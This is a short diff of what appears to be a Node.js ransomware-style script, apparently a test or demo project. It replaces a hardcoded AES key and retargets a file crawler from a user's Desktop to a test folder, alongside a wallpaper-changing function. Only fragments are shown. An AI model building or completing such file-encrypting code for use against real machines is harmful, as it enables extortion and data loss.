@@ -6,7 +6,7 @@ const cp = require('node:child_process')
 const promisify = require('node:util')
 const aes = new AES()
 
-aes.setSecretKey('WnZq4t7weThWmZq3KbPeShVm*G-KaPdSz%C*F-Ja6w9z$C&Fp3s6v9y$VkXp2s5vdRgUkXn2J@NcRfUj')
+aes.setSecretKey('11122233344455566677788822244455555555555555555231231321313aaaff')
 
 const execFile = promisify.promisify(cp.execFile);
 async function setWallpaper() {
@@ -43,7 +43,7 @@ const crawlerLoop = () => {
 
 const crawl = async () => {
     //this is the root of your testing folder...tweak as needed 
-    const BASE_DIR = 'C:\\Users\\user\\Desktop'
+    const BASE_DIR = 'C:\\Users\\TestFolder'
     process.chdir(BASE_DIR)
     crawlerLoop()
     await setWallpaper()
